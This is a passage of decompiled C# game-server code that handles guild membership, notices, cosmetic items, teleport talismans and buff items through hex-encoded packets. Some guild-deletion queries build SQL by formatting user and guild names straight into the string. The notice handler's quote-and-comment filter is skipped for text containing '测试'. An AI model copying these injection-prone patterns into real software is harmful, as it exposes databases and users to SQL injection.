						System.Buffer.BlockCopy(bytes6, 0, array10, 29, bytes6.Length);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array10, 4, 2);
						Players players4 = 得到人物数据(int_);
						if (players4 != null)
						{
							byte[] bytes7 = Encoding.Default.GetBytes(players4.帮派名字);
							System.Buffer.BlockCopy(bytes7, 0, array10, 12, bytes7.Length);
							System.Buffer.BlockCopy(BitConverter.GetBytes(players4.人物全服ID), 0, array10, 10, 2);
							if (players4.Client != null)
							{
								players4.Client.Send(array10, array10.Length);
							}
							RxjhClass.加入帮派(base.UserName, players4.帮派名字, base.Player_Level);
						}
						if (base.Client != null)
						{
							base.Client.Send(array10, array10.Length);
						}
						读帮派数据();
						初始化已装备物品();
						移动离开当前地图(base.人物坐标_地图);
						获取复查范围玩家();
						break;
					}
					case 22:
					{
						byte[] array11 = Converter.hexStringToByte("AA5530000A00E80022000B00CC00000000000000000000000000000216617300000000000000000000000000000000000000000055AA");
						byte[] bytes8 = Encoding.Default.GetBytes(base.UserName);
						System.Buffer.BlockCopy(bytes8, 0, array11, 29, bytes8.Length);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array11, 4, 2);
						Players players5 = 得到人物数据(int_);
						if (players5 != null)
						{
							byte[] bytes9 = Encoding.Default.GetBytes(players5.帮派名字);
							System.Buffer.BlockCopy(bytes9, 0, array11, 12, bytes9.Length);
							System.Buffer.BlockCopy(BitConverter.GetBytes(players5.人物全服ID), 0, array11, 10, 2);
							if (players5.Client != null)
							{
								players5.Client.Send(array11, array11.Length);
							}
						}
						if (base.Client != null)
						{
							base.Client.Send(array11, array11.Length);
						}
						break;
					}
					case 23:
					{
						byte[] array9 = Converter.hexStringToByte("AA5530000A00E80022000B000000000000000000000000000000000217BDD600000000000000000000000000000000000000000055AA");
						byte[] bytes5 = Encoding.Default.GetBytes(base.UserName);
						System.Buffer.BlockCopy(bytes5, 0, array9, 29, bytes5.Length);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array9, 4, 2);
						Players players3 = 得到人物数据(int_);
						if (players3 != null)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(players3.人物全服ID), 0, array9, 10, 2);
							if (players3.Client != null)
							{
								players3.Client.Send(array9, array9.Length);
							}
						}
						if (base.Client != null)
						{
							base.Client.Send(array9, array9.Length);
						}
						break;
					}
					}
					break;
				}
				case 3:
					if (base.人物坐标_地图 == 42101)
					{
						系统提示("当前地图不能退出门派");
					}
					else
					{
						byte[] array4 = Converter.hexStringToByte("AA5530000B00E80022000000000000000000000000000000000000031F000000000000000000000000000000000000000000000055AA");
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array4, array4.Length);
						}
						byte[] bytes2 = Encoding.Default.GetBytes(base.UserName);
						System.Buffer.BlockCopy(bytes2, 0, array4, 29, bytes2.Length);
						string 帮派名字 = base.帮派名字;
						if (base.帮派人物等级 == 6)
						{
							DBA.ExeSqlCommand(string.Format("DELETE  FROM  TBL_XWWL_Guild  WHERE  G_Master  =  '{0}'", base.UserName));
							foreach (Players value in World.allConnectedChars.Values)
							{
								if (value.帮派名字 == 帮派名字)
								{
									RxjhClass.退出门派(value.UserName);
									value.读帮派数据();
									System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array4, 27, 1);
									发送帮派消息(帮派名字, array4, array4.Length);
									value.初始化已装备物品();
									value.移动离开当前地图(value.人物坐标_地图);
									value.获取复查范围玩家();
								}
							}
							DBA.ExeSqlCommand(string.Format("DELETE  FROM  TBL_XWWL_GuildMember  WHERE  G_Name  =  '{0}'", 帮派名字));
						}
						else
						{
							RxjhClass.退出门派(base.UserName);
							读帮派数据();
							System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array4, 27, 1);
							发送帮派消息(帮派名字, array4, array4.Length);
							初始化已装备物品();
							移动离开当前地图(base.人物坐标_地图);
							获取复查范围玩家();
						}
					}
					break;
				case 4:
				{
					byte[] array2 = new byte[14];
					System.Buffer.BlockCopy(封包数据, 29, array2, 0, 14);
					string text = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
					DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
					if (dataTable != null)
					{
						if (base.人物坐标_地图 == 42101)
						{
							系统提示("当前地图不能退出门派");
						}
						else if (dataTable.Rows.Count > 0)
						{
							string b = dataTable.Rows[0]["G_Master"].ToString();
							if (text == b)
							{
								break;
							}
							if (RxjhClass.逐出门派(text, base.帮派名字) == 0)
							{
								byte[] array3 = Converter.hexStringToByte("AA5530000A00E800220000000000000000000000000000000000000421617300000000000000000000000000000000000000000055AA");
								byte[] bytes = Encoding.Default.GetBytes(text);
								System.Buffer.BlockCopy(bytes, 0, array3, 29, bytes.Length);
								发送帮派消息(base.帮派名字, array3, array3.Length);
								Players players = 得到人物数据(text);
								if (players != null)
								{
									players.读帮派数据();
									players.初始化已装备物品();
									players.移动离开当前地图(base.人物坐标_地图);
									players.获取复查范围玩家();
								}
							}
						}
						dataTable.Dispose();
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "加入门派出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 创建门派确认(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = Converter.hexStringToByte("AA5520000000E4001200310000000000000000000000000000000300000000000000000055AA");
				byte[] array2 = new byte[15];
				System.Buffer.BlockCopy(封包数据, 10, array2, 0, 15);
				string text = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				byte[] bytes = Encoding.Default.GetBytes(text);
				System.Buffer.BlockCopy(bytes, 0, array, 10, bytes.Length);
				if (base.Player_Level < 60)
				{
					系统提示("你的等级不够60级，不能创建门派。");
				}
				else if (base.Player_Money < 10000000L)
				{
					系统提示("你的游戏币不够1000万，不能创建门派。");
				}
				else
				{
					if (RxjhClass.创建帮派确认(text) == 1)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 26, 1);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(99), 0, array, 26, 1);
					}
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "创建门派确认出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 创建门派(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = Converter.hexStringToByte("AA5520000000E6001200310000000000000000000000000000000100000000000000000055AA");
				byte[] array2 = new byte[15];
				System.Buffer.BlockCopy(封包数据, 10, array2, 0, 15);
				string text = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				if (base.Player_Level < 60)
				{
					系统提示("你的等级不够60级，不能创建门派。");
				}
				else if (base.Player_Money < 10000000L)
				{
					系统提示("你的游戏币不够1000万不能创建门派。");
				}
				else
				{
					byte[] bytes = Encoding.Default.GetBytes(text);
					System.Buffer.BlockCopy(bytes, 0, array, 10, bytes.Length);
					switch (RxjhClass.创建帮派(base.UserName, text, base.Player_Level))
					{
					case 0:
						base.Player_Money -= 10000000L;
						更新金钱和负重();
						读帮派数据();
						初始化已装备物品();
						System.Buffer.BlockCopy(BitConverter.GetBytes(99), 0, array, 26, 1);
						break;
					case 1:
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 26, 1);
						break;
					case 2:
						系统提示("数据出错，请重新输入。");
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 27, 1);
						break;
					}
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					查帮派();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "创建门派出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 修改帮派公告(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			byte[] array = new byte[50];
			System.Buffer.BlockCopy(封包数据, 14, array, 0, 50);
			string text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
			if (text.IndexOf("测试", 0) != -1)
			{
				text = text.Remove(0, 2);
			}
			else if (text.IndexOf("'") != -1 || text.IndexOf(";") != -1 || text.IndexOf("--") != -1)
			{
				return;
			}
			if (base.帮派人物等级 == 6)
			{
				DBA.ExeSqlCommand(string.Format("UPDATE  TBL_XWWL_Guild  SET  G_Notice  =@sTemp  WHERE  G_Name  =@Userid", base.帮派名字, text), new SqlParameter[2]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.帮派名字),
					SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
				});
				查帮派();
			}
			else
			{
				系统提示("你不是帮主，不可以修改帮派公告。");
			}
		}

		public void 查帮派()
		{
			if (base.帮派Id != 0)
			{
				try
				{
					byte[] array = Converter.hexStringToByte2("AA55C200C802E900B400565E2600000000000000000000000000000000000200000001000000030000006500000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
					byte[] array2 = Converter.hexStringToByte("000000000000A44E55AA");
					DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
					if (dataTable != null)
					{
						byte[] bytes = BitConverter.GetBytes(base.帮派Id);
						System.Buffer.BlockCopy(bytes, 0, array, 10, bytes.Length);
						byte[] bytes2 = Encoding.Default.GetBytes(base.帮派名字);
						System.Buffer.BlockCopy(bytes2, 0, array, 14, bytes2.Length);
						int num = 1;
						int value = int.Parse(dataTable.Rows[0]["Leve"].ToString());
						num = 2;
						int value2 = int.Parse(dataTable.Rows[0]["名声"].ToString());
						int value3 = 0;
						int value4 = 0;
						int value5 = 0;
						long value6 = 0L;
						try
						{
							num = 3;
							value3 = int.Parse(dataTable.Rows[0]["门派武勋"].ToString());
							num = 4;
							value4 = int.Parse(dataTable.Rows[0]["胜"].ToString());
							num = 5;
							value5 = int.Parse(dataTable.Rows[0]["败"].ToString());
							num = 6;
							int.Parse(dataTable.Rows[0]["平"].ToString());
							num = 7;
							value6 = long.Parse(dataTable.Rows[0]["门派财产"].ToString());
						}
						catch (Exception ex)
						{
							Form1.WriteLine(1, "查帮派新出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message + "错误ID：" + num);
						}
						byte[] array3 = new byte[100];
						byte[] bytes3 = Encoding.Default.GetBytes(dataTable.Rows[0]["G_Notice"].ToString());
						System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 30, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 34, 2);
						if (base.帮派门徽 != null)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(World.服务器组ID), 0, array, 42, 2);
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 42, 2);
						}
						System.Buffer.BlockCopy(BitConverter.GetBytes(value3), 0, array, 62, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(value4), 0, array, 66, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(value5), 0, array, 70, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(value6), 0, array, 74, 8);
						DataTable dataTable2 = RxjhClass.得到帮派人数(base.帮派名字);
						int num2 = dataTable2.Rows.Count;
						if (num2 > 100)
						{
							num2 = 100;
						}
						System.Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 38, 2);
						byte[] array4 = new byte[num2 * 24 + array.Length + array2.Length + array3.Length];
						System.Buffer.BlockCopy(array, 0, array4, 0, array.Length);
						System.Buffer.BlockCopy(array2, 0, array4, array4.Length - array2.Length, array2.Length);
						for (int i = 0; i < num2; i++)
						{
							byte[] bytes4 = Encoding.Default.GetBytes(dataTable2.Rows[i]["FLD_NAME"].ToString());
							string @string = Encoding.Default.GetString(bytes4);
							int num3 = int.Parse(dataTable2.Rows[i]["Leve"].ToString());
							if (base.UserName == @string)
							{
								base.帮派人物等级 = num3;
							}
							System.Buffer.BlockCopy(bytes4, 0, array4, array.Length + i * 24, bytes4.Length);
							System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array4, array.Length + 18 + i * 24, 2);
							try
							{
								if (得到人物数据(@string) != null)
								{
									System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array4, array.Length + 20 + i * 24, 2);
								}
							}
							catch (Exception ex2)
							{
								Form1.WriteLine(1, "查帮派  成员  错误![" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
							}
							System.Buffer.BlockCopy(BitConverter.GetBytes(int.Parse(dataTable2.Rows[i]["FLD_LEVEL"].ToString())), 0, array4, array.Length + 16 + i * 24, 2);
						}
						System.Buffer.BlockCopy(bytes3, 0, array4, array.Length + num2 * 24, bytes3.Length);
						System.Buffer.BlockCopy(BitConverter.GetBytes(58 + num2 * 24 + array3.Length + 8), 0, array4, 2, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(52 + num2 * 24 + array3.Length), 0, array4, 8, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send多包(array4, array4.Length);
						}
						dataTable2.Dispose();
						dataTable.Dispose();
					}
				}
				catch (Exception ex3)
				{
					Form1.WriteLine(1, "查帮派出错![" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
				}
			}
		}

		public void 染发(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (base.人物坐标_地图 != 801)
				{
					封包修改(封包数据, 封包大小);
					byte[] array = new byte[4];
					byte[] array2 = new byte[2];
					System.Buffer.BlockCopy(封包数据, 10, array, 0, 1);
					System.Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000015)
					{
						byte[] array3 = Converter.hexStringToByte("AA5527000A00111018000100030041440300000000000FDC143C000000000000D5EF00000000000000000055AA");
						byte[] array4 = Converter.hexStringToByte("AA5512000000121004000000D5EF000000000000000055AA");
						System.Buffer.BlockCopy(array, 0, array3, 12, 1);
						System.Buffer.BlockCopy(array2, 0, array3, 32, 2);
						System.Buffer.BlockCopy(array2, 0, array4, 12, 2);
						System.Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品全局ID, 0, array3, 14, 8);
						System.Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0, array3, 22, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						if (base.Client != null)
						{
							base.Client.Send(array4, array4.Length);
						}
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 10, 2);
						发送当前范围广播数据(array4, array4.Length);
						New人物模版.发色 = BitConverter.ToInt16(array2, 0);
						减去物品(BitConverter.ToInt32(array, 0), 1);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "染发出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 美发(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(封包数据, 10, array, 0, 1);
				System.Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000101)
				{
					byte[] array3 = Converter.hexStringToByte("AA5527002C01081618000100080041440300000000000FDC143C0000000000009B0000000000000000000055AA");
					byte[] array4 = Converter.hexStringToByte("AA5512002A01091604002A019999000000000000000055AA");
					System.Buffer.BlockCopy(array, 0, array3, 12, 1);
					System.Buffer.BlockCopy(array2, 0, array3, 32, 1);
					System.Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品全局ID, 0, array3, 14, 8);
					System.Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0, array3, 22, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					System.Buffer.BlockCopy(array2, 0, array4, 12, 1);
					System.Buffer.BlockCopy(array2, 0, array4, 13, 1);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					if (base.Client != null)
					{
						base.Client.Send(array4, array4.Length);
					}
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 10, 2);
					发送当前范围广播数据(array4, array4.Length);
					New人物模版.发型 = array2[0];
					减去物品(BitConverter.ToInt32(array, 0), 1);
					初始化已装备物品();
					更新武功和状态();
					更新广播人物数据();
					更新装备效果();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "染发出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 删除土灵符(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[15];
				System.Buffer.BlockCopy(封包数据, 10, array2, 0, 15);
				System.Buffer.BlockCopy(封包数据, 24, array, 0, 2);
				土灵符坐标.Remove(BitConverter.ToInt32(array, 0));
				byte[] array3 = Converter.hexStringToByte("AA55310000000F10230001000A003132333400000000000000000000006500000054A8034400007041342FCB44000000000000000055AA");
				System.Buffer.BlockCopy(array, 0, array3, 12, 2);
				System.Buffer.BlockCopy(array2, 0, array3, 14, array2.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "删除土灵符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 保存土灵符(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("银币广场不允许使用土灵符。", 50, "系统提示");
				}
				else
				{
					string[] array = World.地图锁定.Split(';');
					if (array.Length >= 1)
					{
						for (int i = 0; i < array.Length; i++)
						{
							if (int.Parse(array[i]) == base.人物坐标_地图)
							{
								return;
							}
						}
					}
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[15];
					for (int j = 0; j < 15 && 封包数据[10 + j] != 0; j++)
					{
						array3[j] = 封包数据[10 + j];
					}
					string rxjh_name = Encoding.Default.GetString(array3).Replace("\0", string.Empty);
					System.Buffer.BlockCopy(封包数据, 25, array2, 0, 2);
					坐标Class 坐标Class = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					坐标Class.Rxjh_name = rxjh_name;
					if (土灵符坐标.ContainsKey(BitConverter.ToInt32(array2, 0)))
					{
						土灵符坐标.Remove(BitConverter.ToInt32(array2, 0));
					}
					土灵符坐标.Add(BitConverter.ToInt32(array2, 0), 坐标Class);
					发送保存土灵符数据(array3, array2, 坐标Class);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "保存土灵符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送保存土灵符数据(byte[] name, byte[] 保存ID, 坐标Class 坐标)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55310000000D10230001000A003132333400000000000000000000006500000054A8034400007041342FCB44000000000000000055AA");
				System.Buffer.BlockCopy(保存ID, 0, array, 12, 2);
				System.Buffer.BlockCopy(name, 0, array, 14, name.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_Map), 0, array, 29, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_X), 0, array, 33, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_Z), 0, array, 37, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_Y), 0, array, 41, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送保存土灵符数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送土灵符数据()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5594002C010B1086000600");
				byte[] array2 = Converter.hexStringToByte("000000000000000055AA");
				byte[] array3 = new byte[土灵符坐标.Count * 33 + array.Length + array2.Length];
				System.Buffer.BlockCopy(array, 0, array3, 0, array.Length);
				System.Buffer.BlockCopy(array2, 0, array3, array3.Length - array2.Length, array2.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(2 + 土灵符坐标.Count * 33), 0, array3, 8, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(16 + 土灵符坐标.Count * 33), 0, array3, 2, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(土灵符坐标.Count), 0, array3, 10, 1);
				int num = 0;
				foreach (DictionaryEntry item in 土灵符坐标)
				{
					坐标Class 坐标Class = (坐标Class)item.Value;
					int value = (int)item.Key;
					byte[] bytes = Encoding.Default.GetBytes(坐标Class.Rxjh_name);
					System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array3, 12 + num * 33, 2);
					System.Buffer.BlockCopy(bytes, 0, array3, 14 + num * 33, bytes.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(坐标Class.Rxjh_Map), 0, array3, 29 + num * 33, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(坐标Class.Rxjh_X), 0, array3, 33 + num * 33, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(坐标Class.Rxjh_Z), 0, array3, 37 + num * 33, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(坐标Class.Rxjh_Y), 0, array3, 41 + num * 33, 4);
					num++;
				}
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送土灵符数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 使用土灵符(byte[] 封包数据, int length)
		{
			try
			{
				byte[] array;
				byte[] array2;
				byte[] dst;
				byte[] array3;
				坐标Class 坐标Class;
				if (!base.Player死亡 && !打开仓库中)
				{
					if (DateTime.Now.Subtract(使用大土time).TotalSeconds < 10.0)
					{
						系统提示("土灵符每10秒可使用一回", 9, "系统提示");
					}
					else if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					}
					else
					{
						使用大土time = DateTime.Now;
						封包修改(封包数据, length);
						array = new byte[4];
						array2 = new byte[4];
						System.Buffer.BlockCopy(封包数据, 10, array, 0, 2);
						System.Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
						dst = Converter.hexStringToByte("AA552200020308101C0001000000000000000000000000000000000000000000000000000A0055AA");
						array3 = Converter.hexStringToByte("AA552B002C0108101C0001000A003E44030000000000C399053C00000000010018943577010000000000000000000055AA");
						坐标Class = (坐标Class)土灵符坐标[BitConverter.ToInt32(array2, 0)];
						if (坐标Class == null)
						{
							goto IL_0222;
						}
						if (坐标Class.Rxjh_Map != 9001 && 坐标Class.Rxjh_Map != 9101 && 坐标Class.Rxjh_Map != 9201 && 坐标Class.Rxjh_Map != 42101 && 坐标Class.Rxjh_Map != 42101)
						{
							if (坐标Class.Rxjh_Map == 32002)
							{
								if (活动地图剩余时间 > 0)
								{
									FBtime = DateTime.Now;
									系统提示("开始计时,[" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
									goto IL_0222;
								}
								系统提示("移动失败,活动地图剩余时间为零。");
							}
							else
							{
								if (坐标Class.Rxjh_Map != 30000 && 坐标Class.Rxjh_Map != 30100 && 坐标Class.Rxjh_Map != 30200 && 坐标Class.Rxjh_Map != 30300)
								{
									goto IL_0222;
								}
								if (修炼地图剩余时间 > 0)
								{
									FBtime = DateTime.Now;
									系统提示("开始计时,[" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
									goto IL_0222;
								}
								系统提示("移动失败,修炼地图剩余时间为零。");
							}
						}
						else
						{
							系统提示("此处不允许使用。");
						}
					}
				}
				goto end_IL_0000;
				IL_0222:
				byte[] array4 = new byte[4];
				byte[] array5 = new byte[8];
				byte[] dst2 = new byte[4];
				int num = BitConverter.ToInt32(array, 0);
				int value = BitConverter.ToInt32(array2, 0);
				if (num != 0)
				{
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1007000020 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1007000002 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1007000003)
					{
						System.Buffer.BlockCopy(装备栏包裹[num].物品_byte, 16, array4, 0, 4);
						System.Buffer.BlockCopy(装备栏包裹[num].物品_byte, 8, dst2, 0, 4);
						System.Buffer.BlockCopy(装备栏包裹[num].物品_byte, 0, array5, 0, 8);
						int num2 = BitConverter.ToInt32(array4, 0) - 2000000000 - 1;
						if (num2 <= 0)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(2000000000), 0, array3, 32, 4);
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(num2 + 2000000000), 0, array3, 32, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(num2 + 2000000000), 0, 装备栏包裹[num].物品_byte, 16, 4);
						}
						System.Buffer.BlockCopy(array5, 0, array3, 14, 8);
						System.Buffer.BlockCopy(array, 0, array3, 12, 2);
						System.Buffer.BlockCopy(装备栏包裹[num].物品ID, 0, array3, 22, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						if (num2 < 0)
						{
							减去物品(num, 1);
						}
					}
				}
				else
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, dst, 36, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, dst, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
				}
				if (坐标Class != null)
				{
					移动(坐标Class.Rxjh_X, 坐标Class.Rxjh_Y, 坐标Class.Rxjh_Z, 坐标Class.Rxjh_Map);
				}
				获取复查范围玩家();
				获取复查范围Npc();
				获取复查范围地面物品();
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "使用土灵符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void set公有物品()
		{
			foreach (公有药品类 value in 公有药品.Values)
			{
				set公有物品(value);
			}
		}

		public void set公有物品(公有药品类 yp)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5518002C01F9000A00037C17765E00FFFFFFFF000000000000000055AA");
				DateTime t = new DateTime(1970, 1, 1, 8, 0, 0).AddSeconds(yp.时间);
				if (t > DateTime.Now)
				{
					switch (yp.药品ID)
					{
					case 1008000058:
						System.Buffer.BlockCopy(BitConverter.GetBytes(11), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000059:
						System.Buffer.BlockCopy(BitConverter.GetBytes(12), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000060:
						System.Buffer.BlockCopy(BitConverter.GetBytes(13), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						break;
					case 1008000061:
						System.Buffer.BlockCopy(BitConverter.GetBytes(28), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000062:
						System.Buffer.BlockCopy(BitConverter.GetBytes(29), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000063:
						System.Buffer.BlockCopy(BitConverter.GetBytes(30), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						break;
					case 1008000027:
						System.Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
